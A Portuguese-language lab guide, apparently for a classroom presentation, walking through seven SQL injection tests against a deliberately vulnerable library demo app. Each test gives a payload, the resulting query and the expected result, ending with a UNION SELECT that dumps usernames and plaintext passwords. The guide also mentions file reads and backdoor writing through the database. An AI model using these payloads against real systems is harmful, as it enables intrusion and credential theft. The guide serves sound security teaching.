# Roteiro Prático: Testes de Injeção SQL (SQLi)

## Sistema de Biblioteca Acadêmica Vulnerável (`library_demo`)

Este guia documenta um roteiro de 7 testes progressivos de invasão/auditoria utilizando a vulnerabilidade de SQL Injection presente na barra de busca de livros da nossa aplicação vulnerável (`vulnerable_app`).

---

### 🛠️ Informações Importantes sobre a Sintaxe

Nos comandos abaixo, utilizamos o caractere `#` (cerquilha) como delimitador de comentário padrão do MariaDB/MySQL. Ele serve para anular tudo o que estiver à direita da nossa injeção dentro da query original (como aspas e fechamentos de parênteses sobressalentes do próprio sistema).

---

## 📂 ROTEIRO DE TESTES

### TESTE 1 — Mostrar todos os livros (Bypass de Filtro)

Este teste demonstra como um atacante pode anular qualquer filtro de pesquisa e forçar a exibição de todo o acervo do banco de dados, ignorando a palavra-chave buscada.

- **Payload (Inserir no campo de busca):**
  ```sql
  %' OR 1=1 #
  ```
- **Query Gerada no Backend:**
  ```sql
  SELECT * FROM books WHERE title LIKE '%%' OR 1=1 #%'
  ```
- **Resultado Esperado:**
  Todos os livros cadastrados no acervo são exibidos em tela de uma única vez, independente do termo pesquisado.
- **O que explicar na apresentação:**
  - **Alteração da Lógica do WHERE:** O atacante injetou uma instrução lógica alternativa (`OR`).
  - **Condição Sempre Verdadeira:** Como `1=1` é uma verdade matemática absoluta, o banco de dados ignora as outras regras restritivas de filtro.
  - **Controle de Fluxo:** O caractere `#` anulou o fechamento da aspa original (`%'`), mantendo a sintaxe da query perfeitamente válida para o interpretador do MariaDB.

---

### TESTE 2 — Forçar Erro SQL (Fase de Reconhecimento)

Antes de extrair dados, o atacante precisa confirmar se o campo está de fato vulnerável. A forma mais simples de fazer isso é inserindo uma quebra de sintaxe proposital.

- **Payload:**
  ```sql
  '
  ```
- **Resultado Esperado:**
  A aplicação não carrega a tabela e exibe uma mensagem de erro crua vinda do banco de dados, ou um erro interno no servidor (HTTP 500 / Erro de Sintaxe SQL).
- **O que explicar na apresentação:**
  - **Ausência de Validação/Sanitização:** Mostra que o sistema recebe e processa caracteres especiais diretamente na base de dados sem qualquer barreira protetiva.
  - **Concatenação Insegura:** A aspa simples avulsa quebrou o par de aspas original da query, deixando o interpretador SQL sem saber como fechar a string.
  - **Exposição de Detalhes Internos:** Exibir o erro bruto do banco para o usuário final é uma falha de configuração de segurança (_Information Disclosure_), revelando que o banco de dados por trás do sistema é o MariaDB/MySQL.

---

### TESTE 3 — UNION SELECT (Injeção de Linha Falsa)

O ataque do tipo UNION consiste em combinar o resultado da consulta legítima com uma consulta arbitrária criada pelo atacante. Neste passo, injetamos uma linha de dados totalmente falsa dentro da interface gráfica da biblioteca.

- **Payload:**
  ```sql
  %' UNION SELECT 1,'HACKED','SQL Injection','Cyber',2026,999,NOW() #
  ```
- **Query Gerada no Backend:**
  ```sql
  SELECT * FROM books WHERE title LIKE '%%' UNION SELECT 1, 'HACKED', 'SQL Injection', 'Cyber', 2026, 999, NOW() #%'
  ```
- **Resultado Esperado:**
  Uma nova linha fictícia aparece na tabela de livros com as informações inseridas no payload:
  - **Título:** HACKED
  - **Autor:** SQL Injection
  - **Categoria:** Cyber
  - **Ano:** 2026
  - **Quantidade:** 999
- **O que explicar na apresentação:**
  - **Manipulação Direta de Resultados:** Demonstra que o atacante tem controle sobre o que é exibido na tela da aplicação, burlando as fontes de dados reais.
  - **Alinhamento de Colunas:** Para a cláusula `UNION` funcionar, a consulta injetada deve possuir o mesmo número exato de colunas (neste caso, 7 colunas) e tipos de dados compatíveis com a tabela `books`.
  - **Adulteração Virtual:** Embora nenhum dado real tenha sido inserido permanentemente na tabela através de um `INSERT`, o retorno exibido é severamente comprometido.

---

### TESTE 4 — Descobrir Nome do Banco (Information Gathering)

Agora que o atacante consegue usar o `UNION` para imprimir informações na tela, ele começa a mapear a infraestrutura interna do banco de dados, começando pelo nome do banco atual.

- **Payload:**
  ```sql
  %' UNION SELECT 1,database(),'SQLI','DB',2026,999,NOW() #
  ```
- **Resultado Esperado:**
  Na coluna reservada ao título do livro, a aplicação exibirá o nome real do banco de dados ativo:
  ```text
  library_demo
  ```
- **O que explicar na apresentação:**
  - **Enumeração Ativa:** O atacante está executando funções nativas do banco de dados (`database()`) de dentro do input do usuário.
  - **Mapeamento de Alvo:** Descobrir o nome do banco de dados é um dos primeiros passos essenciais para formular ataques subsequentes mais precisos.

---

### TESTE 5 — Descobrir Usuário do Banco (Mapeamento de Privilégios)

Saber qual usuário o sistema web utiliza para se conectar ao banco ajuda a determinar o nível de poder que o atacante tem (por exemplo, se é um usuário restrito ou o superusuário root).

- **Payload:**
  ```sql
  %' UNION SELECT 1,user(),'SQLI','DB',2026,999,NOW() #
  ```
- **Resultado Esperado:**
  A aplicação exibe no campo reservado ao título o usuário que estabeleceu a conexão atual:
  ```text
  root@localhost
  ```
- **O que explicar na apresentação:**
  - **Exposição da Infraestrutura:** Revela se a aplicação web está violando o "Princípio do Menor Privilégio" (rodar o banco como root expõe todo o sistema operacional a riscos drásticos).
  - **Escalada de Privilégios:** Se o atacante constatar que é root ou DBA, ele sabe que poderá futuramente ler arquivos do sistema operacional (usando `LOAD_FILE()`) ou até mesmo escrever um backdoor no disco (usando `INTO OUTFILE`).

---

### TESTE 6 — Listar Tabelas do Banco (Enumeração de Estrutura)

O atacante não sabe quais tabelas existem no sistema. Ele usará o catálogo global de metadados do MariaDB (`information_schema`) para listar todas as tabelas contidas dentro do banco de dados do projeto.

- **Payload:**
  ```sql
  %' UNION SELECT 1,table_name,'SQLI','DB',2026,999,NOW() FROM information_schema.tables WHERE table_schema='library_demo' #
  ```
- **Resultado Esperado:**
  A listagem do acervo de livros trará como títulos os nomes das tabelas reais existentes na base de dados:
  ```text
  users
  books
  ```
- **O que explicar na apresentação:**
  - **Vazamento de Metadados:** Demonstra como tabelas de sistema criadas exclusivamente para administração interna do banco de dados (como as do `information_schema`) podem ser abusadas por invasores.
  - **Descoberta do Alvo Final:** Ao avistar uma tabela chamada `users`, o atacante localiza seu verdadeiro alvo para roubo de identidade.

---

### TESTE 7 — Consultar Usuários via SQL Injection (Vazamento de Credenciais)

O teste final e mais crítico: exfiltrar toda a base de usuários cadastrados com suas respectivas senhas e permissões diretamente para a tabela de livros exposta.

- **Payload:**
  ```sql
  %' UNION SELECT id,username,password,role,2025,1,created_at FROM users #
  ```
- **Query Vulnerável Original:**
  ```sql
  SELECT * FROM books WHERE title LIKE '%{search}%'
  ```
- **Query Manipulada Completa:**
  ```sql
  SELECT * FROM books WHERE title LIKE '%%' UNION SELECT id, username, password, role, 2025, 1, created_at FROM users #%'
  ```
- **Resultado Esperado:**
  Os registros confidenciais da tabela `users` aparecem mesclados no grid de livros na tela.
  - **Mapeamento visual dos campos injetados:**
    - **No campo ID:** O `id` do usuário.
    - **No campo Título:** O `username` (ex: admin, luan, user).
    - **No campo Autor:** A `password` em texto claro (ex: admin123, luan123).
    - **No campo Categoria:** O nível de acesso/permissão (`role` ex: admin, user).
- **O que explicar na apresentação:**
  - **Comprometimento de Confidencialidade:** Este é o pior cenário possível em um ataque SQLi. Dados confidenciais de credenciais de acesso foram expostos a um agente externo não autorizado.
  - **Senhas em Texto Claro:** Evidencia o perigo adicional de armazenar senhas sem hash criptográfico (como SHA-256 ou Bcrypt) em conjunto com falhas de injeção.
  - **Acesso Indevido Completo:** Com as credenciais expostas na tela, o atacante agora pode fazer login legítimo na aplicação, obtendo controle total das permissões administrativas.
